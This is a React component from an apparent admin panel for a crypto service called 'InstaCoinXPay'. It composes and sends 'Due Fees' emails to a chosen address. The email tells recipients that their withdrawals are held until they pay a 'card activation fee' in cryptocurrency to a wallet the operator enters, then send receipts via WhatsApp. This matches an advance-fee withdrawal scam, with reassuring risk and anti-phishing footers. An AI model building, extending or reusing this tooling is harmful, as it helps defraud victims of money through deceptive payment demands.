import React, { useState } from "react";
import { useLocation } from "react-router-dom";
import TemplateLayout from "./TemplateLayout";

const DueFees = () => {
  const location = useLocation();
  const email = location.state?.email || "";
  
  const [formData, setFormData] = useState({
    customer: "Customer",
    dueAmount: "300",
    cryptoType: "BTC",
    btcAddress: "Official BTC Receiving Address",
  });

  const [sending, setSending] = useState(false);
  const [message, setMessage] = useState({ type: '', text: '' });

  const cryptoOptions = [
    "BTC", "TRX", "USDTBEP20", "USDTTRC", "ETH", 
    "LTC", "DOGE", "BNB", "XRP", "SOL"
  ];

  const handleSend = async () => {
    try {
      setSending(true);
      setMessage({ type: '', text: '' });
      
      const token = localStorage.getItem('token');
      
      if (!token) {
        setMessage({ type: 'error', text: 'Authentication token not found. Please login again.' });
        setSending(false);
        return;
      }

      if (!email) {
        setMessage({ type: 'error', text: 'Recipient email not found. Please go back and enter an email.' });
        setSending(false);
        return;
      }

      const response = await fetch('/api/admin/mail/due-fees', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({
          email: email,
          customer: formData.customer,
          dueAmount: formData.dueAmount,
          cryptoType: formData.cryptoType,
          btcAddress: formData.btcAddress
        })
      });

      const data = await response.json();

      if (data.success) {
        setMessage({ 
          type: 'success', 
          text: `✅ ${data.template || 'Due Fees'} email sent successfully to ${email}` 
        });
        
        // Clear success message after 5 seconds
        setTimeout(() => {
          setMessage({ type: '', text: '' });
        }, 5000);
      } else {
        setMessage({ type: 'error', text: `❌ Failed: ${data.error || 'Unknown error occurred'}` });
      }
    } catch (error) {
      console.error('Email send error:', error);
      setMessage({ 
        type: 'error', 
        text: '❌ Error sending email. Please check your connection and try again.' 
      });
    } finally {
      setSending(false);
    }
  };

  return (
    <TemplateLayout 
      title="Edit Template - Due Fees" 
      formData={formData} 
      setFormData={setFormData}
    >
      {/* Message Display */}
      {message.text && (
        <div style={{
          padding: '12px 16px',
          marginBottom: '20px',
          borderRadius: '6px',
          backgroundColor: message.type === 'success' ? '#d4edda' : '#f8d7da',
          color: message.type === 'success' ? '#155724' : '#721c24',
          border: message.type === 'success' ? '1px solid #c3e6cb' : '1px solid #f5c6cb',
          fontSize: '14px',
          fontWeight: '500'
        }}>
          {message.text}
        </div>
      )}

      {/* Email Info Display */}
      {email && (
        <div style={{
          padding: '10px 16px',
          marginBottom: '20px',
          backgroundColor: '#e7f3ff',
          border: '1px solid #b8daff',
          borderRadius: '6px',
          color: '#004085',
          fontSize: '14px',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between'
        }}>
          <span><strong>📧 Sending to:</strong> {email}</span>
          <span style={{ fontSize: '12px', color: '#666' }}>(from previous step)</span>
        </div>
      )}

      <div className="df-form-group">
        <label htmlFor="customer-due">
          Customer Name <span style={{color: '#ff0000'}}>*</span>
        </label>
        <input
          id="customer-due"
          type="text"
          value={formData.customer}
          onChange={(e) => setFormData({ ...formData, customer: e.target.value })}
          className="df-form-input"
          placeholder="Enter customer name"
          required
        />
      </div>

      <div className="df-form-group">
        <label htmlFor="due-amount">
          Due Amount ($) <span style={{color: '#ff0000'}}>*</span>
        </label>
        <input
          id="due-amount"
          type="number"
          min="0"
          step="1"
          value={formData.dueAmount}
          onChange={(e) => setFormData({ ...formData, dueAmount: e.target.value })}
          className="df-form-input"
          placeholder="e.g., 300"
          required
        />
      </div>

      <div className="df-form-group">
        <label htmlFor="crypto-type">
          Cryptocurrency Type <span style={{color: '#ff0000'}}>*</span>
        </label>
        <select
          id="crypto-type"
          value={formData.cryptoType}
          onChange={(e) => setFormData({ ...formData, cryptoType: e.target.value })}
          className="df-form-select"
          required
          style={{
            width: '100%',
            padding: '10px',
            border: '1px solid #ddd',
            borderRadius: '4px',
            fontSize: '14px'
          }}
        >
          {cryptoOptions.map(option => (
            <option key={option} value={option}>{option}</option>
          ))}
        </select>
      </div>

      <div className="df-form-group">
        <label htmlFor="receiving-address">
          Receiving Address <span style={{color: '#ff0000'}}>*</span>
        </label>
        <input
          id="receiving-address"
          type="text"
          value={formData.btcAddress}
          onChange={(e) => setFormData({ ...formData, btcAddress: e.target.value })}
          className="df-form-input"
          placeholder="Enter wallet address"
          required
        />
        <small style={{ color: '#666', fontSize: '11px', marginTop: '4px', display: 'block' }}>
          Enter the wallet address where payment should be sent
        </small>
      </div>

      <div className="df-preview" style={{ 
        marginTop: '30px', 
        border: '1px solid #e0e0e0', 
        padding: '20px', 
        borderRadius: '8px', 
        backgroundColor: '#f9f9f9' 
      }}>
        <h3 style={{ 
          marginTop: 0, 
          marginBottom: '20px', 
          color: '#333', 
          borderBottom: '1px solid #ddd', 
          paddingBottom: '10px' 
        }}>
          Email Preview
        </h3>
        
        <p className="df-preview-text">
          Dear <span className="df-red">{formData.customer}</span>,
        </p>
        <p className="df-preview-text">Greetings from InstaCoinXPay.</p>
        <p className="df-preview-text">
          We would like to inform you that the card activation fee of <span className="df-red">${formData.dueAmount}</span> for your account is currently pending. Kindly note that the activation process of your card cannot be completed until the due activation fee is successfully cleared.
        </p>
        <p className="df-preview-text">
          Please be advised that until the pending fee is settled, your withdrawal request may experience delays or processing issues. Once the payment is received and verified by our billing department, your card activation process will be completed, and your withdrawal and transaction services will function without any limitations.
        </p>
        <p className="df-preview-text">
          You may complete the payment using <span className="df-red">{formData.cryptoType}</span> to our official receiving address provided below:
        </p>
        <p className="df-preview-text">
          <span className="df-red">{formData.cryptoType}</span> Payment Address: <span className="df-red">{formData.btcAddress}</span>
        </p>
        <p className="df-preview-text">
          After completing the payment, kindly send the payment confirmation screenshot or transaction receipt to us via registered email or through our WhatsApp Support Team for verification and faster processing.
        </p>
        <p className="df-preview-text">
          If you require any assistance regarding the payment process or have any questions, please feel free to contact our Customer Support Team. We are always available to assist you.
        </p>
        <p className="df-preview-text">Thank you for choosing InstaCoinXPay.</p>
        <p className="df-preview-text">Best Regards,<br />InstaCoinXPay Support Team</p>
        
        <div style={{ marginTop: '20px', borderTop: '1px solid #eee', paddingTop: '15px' }}>
          <p className="df-preview-text" style={{ fontSize: "12px", color: "#666", margin: "5px 0" }}>
            <strong>Risk warning:</strong> Cryptocurrency trading is subject to high market risk. InstaCoinXPay will make the best efforts to choose high-quality coins, but will not be responsible for your trading losses. Please trade with caution.
          </p>
          <p className="df-preview-text" style={{ fontSize: "12px", color: "#666", margin: "5px 0" }}>
            <strong>Kindly note:</strong> Please be aware of phishing sites and always make sure you are visiting the official InstaCoinXPay website when entering sensitive data.
          </p>
          <p className="df-preview-text" style={{ fontSize: "12px", color: "#666", textAlign: "center", marginTop: "15px" }}>
            © 2026 InstaCoinXPay, All Rights Reserved
          </p>
        </div>
      </div>

      {/* Action Buttons */}
      <div style={{ 
        display: "flex", 
        gap: "15px", 
        marginTop: "30px", 
        justifyContent: "flex-end",
        borderTop: '1px solid #e0e0e0',
        paddingTop: '20px'
      }}>
        <button
          className="tl-send-btn"
          style={{ 
            background: "#6c757d",
            padding: "12px 24px",
            border: "none",
            borderRadius: "6px",
            color: "white",
            fontSize: "16px",
            cursor: "pointer",
            transition: "opacity 0.3s",
            display: 'flex',
            alignItems: 'center',
            gap: '8px'
          }}
          onClick={() => window.history.back()}
        >
          <span>←</span> Back
        </button>
        
        <button 
          className="tl-send-btn" 
          onClick={handleSend}
          disabled={sending || !email}
          style={{ 
            background: sending ? "#6c757d" : "#dc3545",
            padding: "12px 32px",
            border: "none",
            borderRadius: "6px",
            color: "white",
            fontSize: "16px",
            fontWeight: "bold",
            cursor: sending || !email ? "not-allowed" : "pointer",
            opacity: sending || !email ? 0.7 : 1,
            transition: "all 0.3s",
            display: 'flex',
            alignItems: 'center',
            gap: '8px'
          }}
        >
          {sending ? (
            <>
              <span>⏳</span>
              Sending...
            </>
          ) : (
            <>
              <span>📧</span>
              Send Mail
            </>
          )}
        </button>
      </div>

      {/* Required Fields Note */}
      <p style={{ 
        fontSize: '12px', 
        color: '#666', 
        marginTop: '10px',
        textAlign: 'right',
        fontStyle: 'italic'
      }}>
        <span style={{color: '#ff0000'}}>*</span> Required fields
      </p>
    </TemplateLayout>
  );
};

export default DueFees;